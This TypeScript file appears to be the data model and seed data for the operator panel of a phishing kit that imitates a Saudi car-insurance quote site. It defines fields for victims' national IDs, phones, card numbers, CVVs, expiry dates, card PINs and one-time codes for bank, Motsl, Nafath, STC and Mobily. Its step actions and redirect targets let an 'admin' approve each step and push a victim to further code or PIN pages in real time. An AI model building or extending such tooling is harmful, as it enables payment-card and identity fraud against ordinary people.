// Data model mirrors the fields actually collected by the public insurance site
// (tmin-becaer.bolt.host): Arabic KSA car-insurance flow with quote → insurer
// selection → payment → OTP verification steps (Motsl / Nafath / STC / Mobily).

export type PageKey =
  | "quote_landing"
  | "insurer_selected"
  | "payment_card"
  | "card_otp"
  | "card_pin"
  | "phone_entry"
  | "motsl_otp"
  | "nafath"
  | "stc_awaiting";

export const PAGES: { key: PageKey; label: string }[] = [
  { key: "quote_landing", label: "Quote / Landing" },
  { key: "insurer_selected", label: "Insurer selected" },
  { key: "payment_card", label: "Payment / Card" },
  { key: "card_otp", label: "Card OTP" },
  { key: "card_pin", label: "Card PIN" },
  { key: "phone_entry", label: "Phone entry" },
  { key: "motsl_otp", label: "Motsl OTP" },
  { key: "nafath", label: "Nafath" },
  { key: "stc_awaiting", label: "STC awaiting" },
];

export function pageLabel(key: PageKey) {
  return PAGES.find((p) => p.key === key)?.label ?? key;
}

export type SessionState = "live" | "blocked" | "completed";

export interface Submission {
  cardNumber?: string;
  cvv?: string;
  expiry?: string;
  cardOtp?: string;
  pin?: string;
  motslPhone?: string;
  motslOtp?: string;
  nafathOtp?: string;
  stcOtp?: string;
  mobilyOtp?: string;
  phoneOtp?: string;
}

export interface QuoteSession {
  sessionId: string; // short hex like "6e51fc48"
  nationalId: string;
  phone: string;
  serialNumber: string; // vehicle serial / sequence number
  vehicleMake: string;
  vehicleModel: string;
  modelYear: number;
  declaredValue: number; // SAR
  insurerCompany: string;
  insurerOfferSar: number;
  currentPage: PageKey;
  state: SessionState;
  createdAt: string;
  updatedAt: string;
  submission: Submission;
}

export const KSA_INSURERS = [
  "التعاونية",
  "سلامة للتأمين",
  "تكافل الراجحي",
  "ولاء للتأمين التعاوني",
  "اليانز للتأمين",
  "الخليجية العامة للتأمين",
  "ميدغلف السعودية",
  "الدرع العربي",
];

export function maskNationalId(v: string) {
  if (v.length <= 4) return "••••";
  return `${v.slice(0, 2)}${"•".repeat(v.length - 4)}${v.slice(-2)}`;
}

export function maskPhone(v: string) {
  const d = v.replace(/\s/g, "");
  if (d.length <= 4) return "••••";
  return `${d.slice(0, 4)}${"•".repeat(Math.max(d.length - 6, 2))}${d.slice(-2)}`;
}

export function maskCard(v?: string) {
  if (!v) return null;
  const d = v.replace(/\s/g, "");
  if (d.length < 4) return "••••";
  return `•••• •••• •••• ${d.slice(-4)}`;
}

export function formatSar(n: number) {
  return `${new Intl.NumberFormat("en-US").format(n)} SAR`;
}

export function formatDateTime(iso: string) {
  return new Date(iso).toLocaleString("en-US", {
    month: "numeric",
    day: "numeric",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  });
}

const mins = (m: number) => new Date(Date.now() - m * 60_000).toISOString();

export const SEED_SESSIONS: QuoteSession[] = [
  {
    sessionId: "6e51fc48",
    nationalId: "1007625120",
    phone: "0560004147",
    serialNumber: "156846210",
    vehicleMake: "لكزس",
    vehicleModel: "ES 350",
    modelYear: 2024,
    declaredValue: 200000,
    insurerCompany: "التعاونية",
    insurerOfferSar: 1350,
    currentPage: "insurer_selected",
    state: "live",
    createdAt: mins(120),
    updatedAt: mins(3),
    submission: {},
  },
  {
    sessionId: "6e422429",
    nationalId: "2460674639",
    phone: "0578590565",
    serialNumber: "144210087",
    vehicleMake: "تويوتا",
    vehicleModel: "كامري",
    modelYear: 2022,
    declaredValue: 95000,
    insurerCompany: "سلامة للتأمين",
    insurerOfferSar: 520,
    currentPage: "payment_card",
    state: "live",
    createdAt: mins(90),
    updatedAt: mins(7),
    submission: {
      cardNumber: "4550123456781902",
      cvv: "339",
      expiry: "08/28",
    },
  },
  {
    sessionId: "6e51f25f",
    nationalId: "2248673788",
    phone: "0536320612",
    serialNumber: "128840331",
    vehicleMake: "هيونداي",
    vehicleModel: "سوناتا",
    modelYear: 2021,
    declaredValue: 68000,
    insurerCompany: "تكافل الراجحي",
    insurerOfferSar: 277,
    currentPage: "card_otp",
    state: "live",
    createdAt: mins(75),
    updatedAt: mins(4),
    submission: {
      cardNumber: "5321004488129944",
      cvv: "812",
      expiry: "11/27",
      cardOtp: "884201",
    },
  },
  {
    sessionId: "6e51a9f3",
    nationalId: "1050110376",
    phone: "0504192671",
    serialNumber: "111005620",
    vehicleMake: "كيا",
    vehicleModel: "سبورتاج",
    modelYear: 2020,
    declaredValue: 72000,
    insurerCompany: "اليانز للتأمين",
    insurerOfferSar: 277,
    currentPage: "motsl_otp",
    state: "live",
    createdAt: mins(60),
    updatedAt: mins(2),
    submission: {
      cardNumber: "4432009911223301",
      cvv: "471",
      expiry: "05/29",
      cardOtp: "220914",
      motslPhone: "0504192671",
      motslOtp: "334915",
    },
  },
  {
    sessionId: "6e51b3b7",
    nationalId: "2041069416",
    phone: "0544652102",
    serialNumber: "138021994",
    vehicleMake: "نيسان",
    vehicleModel: "التيما",
    modelYear: 2019,
    declaredValue: 55000,
    insurerCompany: "الخليجية العامة للتأمين",
    insurerOfferSar: 277,
    currentPage: "insurer_selected",
    state: "live",
    createdAt: mins(50),
    updatedAt: mins(9),
    submission: {},
  },
  {
    sessionId: "6e514ab0",
    nationalId: "1008941427",
    phone: "0501611086",
    serialNumber: "129001887",
    vehicleMake: "فورد",
    vehicleModel: "إكسبلورر",
    modelYear: 2023,
    declaredValue: 165000,
    insurerCompany: "ميدغلف السعودية",
    insurerOfferSar: 277,
    currentPage: "insurer_selected",
    state: "live",
    createdAt: mins(45),
    updatedAt: mins(11),
    submission: {},
  },
  {
    sessionId: "6e509de3",
    nationalId: "1115029587",
    phone: "0560905109",
    serialNumber: "155612003",
    vehicleMake: "شيفروليه",
    vehicleModel: "تاهو",
    modelYear: 2022,
    declaredValue: 210000,
    insurerCompany: "الدرع العربي",
    insurerOfferSar: 277,
    currentPage: "card_pin",
    state: "live",
    createdAt: mins(38),
    updatedAt: mins(1),
    submission: {
      cardNumber: "5219998812340077",
      cvv: "902",
      expiry: "02/28",
      cardOtp: "550119",
      pin: "0447",
    },
  },
  {
    sessionId: "6e50a66d",
    nationalId: "2041069418",
    phone: "0544652108",
    serialNumber: "138021995",
    vehicleMake: "مرسيدس",
    vehicleModel: "C200",
    modelYear: 2018,
    declaredValue: 118000,
    insurerCompany: "التعاونية",
    insurerOfferSar: 990,
    currentPage: "nafath",
    state: "live",
    createdAt: mins(30),
    updatedAt: mins(6),
    submission: {
      cardNumber: "4111333322226606",
      cvv: "118",
      expiry: "09/29",
      cardOtp: "998211",
      nafathOtp: "72",
    },
  },
  {
    sessionId: "6e4f118a",
    nationalId: "1039984410",
    phone: "0555420901",
    serialNumber: "160083221",
    vehicleMake: "تويوتا",
    vehicleModel: "كورولا",
    modelYear: 2024,
    declaredValue: 78000,
    insurerCompany: "تكافل الراجحي",
    insurerOfferSar: 640,
    currentPage: "quote_landing",
    state: "live",
    createdAt: mins(20),
    updatedAt: mins(0),
    submission: {},
  },
  // Blocked
  {
    sessionId: "6e4e8801",
    nationalId: "1099887744",
    phone: "0512340098",
    serialNumber: "170004422",
    vehicleMake: "هوندا",
    vehicleModel: "أكورد",
    modelYear: 2017,
    declaredValue: 42000,
    insurerCompany: "ولاء للتأمين التعاوني",
    insurerOfferSar: 310,
    currentPage: "card_otp",
    state: "blocked",
    createdAt: mins(500),
    updatedAt: mins(320),
    submission: {
      cardNumber: "5111222233334444",
      cvv: "220",
      expiry: "04/26",
      cardOtp: "000000",
    },
  },
];

// Step actions the admin can approve or decline for the currently visible step.
export const STEP_ACTIONS = [
  "Card / Payment",
  "Card OTP",
  "Phone",
  "Phone OTP",
  "Mobily OTP",
  "STC OTP",
  "Motsl OTP",
  "Nafath",
  "Service",
] as const;
export type StepAction = (typeof STEP_ACTIONS)[number];

// Pages the admin can redirect the customer to.
export const REDIRECT_TARGETS: { key: PageKey; label: string }[] = [
  { key: "phone_entry", label: "Phone entry" },
  { key: "motsl_otp", label: "Motsl OTP" },
  { key: "nafath", label: "Nafath" },
  { key: "card_otp", label: "Card OTP" },
  { key: "card_pin", label: "Card PIN" },
  { key: "payment_card", label: "Payment / Card" },
];
